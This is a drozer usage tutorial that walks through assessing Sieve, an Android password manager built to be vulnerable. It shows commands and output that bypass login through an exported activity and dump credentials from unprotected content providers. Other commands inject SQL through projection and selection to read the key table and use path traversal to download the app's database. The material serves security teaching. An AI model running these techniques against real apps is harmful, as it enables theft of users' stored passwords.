---
layout: drozer-guide
title: "Using Drozer for application security assessments"
description: abcd
categories:
  - drozer
  - usage
tags:
---
## Using Drozer for Application Security Assessments

Once you have successfully installed drozer, and have established a session between your PC and device, you will no doubt want to find out how to use drozer.

This section guides you through how to perform a limited section of an assessment of a vulnerable app. The name of the app being used is Sieve, which can be downloaded from the MWR Labs [website.](https://mwr.to/sieve)

* * *

### Sieve

Sieve is a small Password Manager app created to showcase some of the common vulnerabilities found in Android applications.

When Sieve is first launched, it requires the user to set a 16 character ‘master password’ and a 4 digit pin that are used to protect passwords that the user enters later. The user can use Sieve to store passwords for a variety of services, to be retrieved at a later date if the correct credentials are required.

Before you start this tutorial, install Sieve onto an Android emulator and create a few sets of credentials.

* * *

### Retrieving Package Information

The first step in assessing Sieve is to find it on the Android device. Apps installed on an Android device are uniquely identified by their ‘package name’. We can use the `app.package.list` command to find the identifier for Sieve:

```
dz> run app.package.list -f sieve  
com.mwr.example.sieve
```

We can ask drozer to provide some basic information about the package using the `app.package.info` command:

```
dz> run app.package.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Process Name: com.mwr.example.sieve
Version: 1.0
Data Directory: /data/data/com.mwr.example.sieve
APK Path: /data/app/com.mwr.example.sieve-2.apk
UID: 10056
GID: [1028, 1015, 3003]
Shared Libraries: null
Shared User ID: null
Uses Permissions:
 - android.permission.READ_EXTERNAL_STORAGE
 - android.permission.WRITE_EXTERNAL_STORAGE
 - android.permission.INTERNET
Defines Permissions:
 - com.mwr.example.sieve.READ_KEYS
 - com.mwr.example.sieve.WRITE_KEYS
```

This shows us a number of details about the app, including the version, where the app keeps its data on the device, where it is installed and a number of details about the permissions allowed to the app.

* * *

### Identify the Attack Surface

For the sake of this tutorial, we will only consider vulnerabilities exposed through Android’s built-in mechanism for Inter-Process Communication (IPC). These vulnerabilities typically result in the leakage of sensitive data to other apps installed on the same device.

We can ask drozer to report on Sieve’s attack surface:

```
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
 3 activities exported
 0 broadcast receivers exported
 2 content providers exported
 2 services exported
 is debuggable
```

This shows that we have a number of potential vectors. The app ‘exports’ (makes accessible to other apps) a number of activities (screens used by the app), content providers (database objects) and services (background workers).

We also note that the service is debuggable, which means that we can attach a debugger to the process, using adb, and step through the code.

### Launching Activities

We can drill deeper into this attack surface by using some more specific commands. For instance, we can ask which activities are exported by Sieve:

```
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
 com.mwr.example.sieve.FileSelectActivity
 com.mwr.example.sieve.MainLoginActivity
 com.mwr.example.sieve.PWList
```

One of these we expect (MainLoginActivity) because this is the screen displayed when we first launch the application.

The other two are less expected: in particular, the PWList activity. Since this activity is exported and does not require any permission, we can ask drozer to launch it:

```
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```

This formulates an appropriate Intent in the background, and delivers it to the system through the `startActivity` call. Sure enough, we have successfully bypassed the authorization and are presented with a list of the user’s credentials:

IMAGE IMAGE

When calling `app.activity.start` it is possible to build a much more complex intent. As with all drozer modules, you can request more usage information:


```
dz> help app.activity.start 
usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY]
[--component PACKAGE COMPONENT] [--data-uri DATA_URI]
[--extra TYPE KEY VALUE] [--
flags FLAGS [FLAGS ...]]
[--mimetype MIMETYPE]
```

### Reading from Content Providers

Next we can gather some more information about the content providers exported by the app. Once again we have a simple command available to request additional information:

```
dz> run app.provider.info -a com.mwr.example.sieve 
  Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.DBContentProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
  Path Permissions:
  Path: /Keys
  Type: PATTERN_LITERAL
  Read Permission: com.mwr.example.sieve.READ_KEYS
  Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.FileBackupProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
```

This shows the two exported content providers that the attack surface 
alluded to in Section 3.3. It confirms that these content providers do not require any particular permission to interact with them, except for the `/Keys` path in the DBContentProvider.

#### Database-backed Content Providers (Data Leakage)

It is a fairly safe assumption that a content provider called ‘DBContentProvider’ will have some form of database in its backend. However, without knowing how this content provider is organised, we will have a hard time extracting any information. 

We can reconstruct part of the content URIs to access the DBContentProvider, because we know that they must begin with “content://”. However, we cannot know all of the path components that will be accepted by the provider. 

Fortunately, Android apps tend to give away hints about the content URIs. For instance, in the output of the `app.provider.info` command we see that “/Keys” probably exists as a path, although we cannot query it without the READ_KEYS permission.

drozer provides a scanner module that brings together various ways to guess paths and divine a list of accessible content URIs:

```
dz> run scanner.provider.finduris -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.
example.sieve.DBContentProvider/
... 
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys 
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

We can now use other drozer modules to retrieve information from those content URIs, or even modify the data 
in the database:

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64
-
encoded)
email: incognitoguy50@gmail.com
```

Once again we have defeated the app’s security and retrieved a list of usernames from the app. In this example, drozer has decided to base64 encode the password. This indicates that field contains a binary blob that otherwise could not be represented in the console.

#### Database-backed Content Providers (SQL Injection) 

The Android platform promotes the use of SQLite databases for storing user data. Since these databases use SQL, it should come as no surprise that they can be vulnerable to SQL injection. It is simple to test for SQL injection by manipulating the projection and selection fields that are passed to the content provider:

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'" 
unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" 
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

Android returns a very verbose error message, showing the entire query that it tried to execute. We can fully exploit this vulnerability to list all tables in the database:

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* 
FROM SQLITE_MASTER WHERE type='table';--" 
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... | 
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
| table | Key              | Key              | 5        | CREATE TABLE ... |
```
or to query otherwise protected tables:

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
| Password | pin |
| thisismypassword | 9876 |
```

#### File System-backed Content Providers

A content provider can provide access to the underlying file system. This allows apps to share files, where the Android sandbox would otherwise prevent it. Since we can reasonably assume that FileBackupProvider is a file system-backed content provider and that the path component represents the location of the file we want to open, we can easily guess the content URIs for this and use a drozer module to read the files:

```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 
127.0.0.1            localhost
```

Reading the /etc/hosts file is not a big problem (it is world readable anyway) but having discovered the path to the application’s data directory in Section 3.2 we can go after more sensitive information:

```
dz> run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db
Written 24576 bytes 
```

This has copied the application’s database from the device to the local machine, where it can be browsed with sqlite to extract not only the user’s encrypted passwords, but also their master password.

#### Content Provider Vulnerabilities

We have seen that content providers can be vulnerable to both SQL injection and directory traversal. drozer offers modules to automatically test for simple cases of these vulnerabilities:

```
dz> run scanner.provider.injection -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve... 
Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
dz> run scanner.provider.traversal -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve... 
Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider
```

### Interacting with Services

So far we have almost compromised Sieve. We have extracted th
e user’s master password, and some cipher text 
pertaining to their service passwords. This is good, but we can fully compromise Sieve through the services that 
it exports. 
Way back in Section 3.3, we identified that Sieve exported two services. As with ac
tivities and content 
providers, we can ask for a little more detail:

```
dz> run app.service.info -a com.mwr.example.sieve 
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null
```

Once again, these services are exported to all other apps, with no permission required to access them. Since we 
are trying to decrypt passwords, CryptoService looks interesting. 

It is left as an exercise to the reader to fully exploit Sieve’s CryptoService. It would typically involve 
decompiling the app to determine the protocol, and using ‘app.service.send’ or writing a custom drozer module 
to send messages to the service.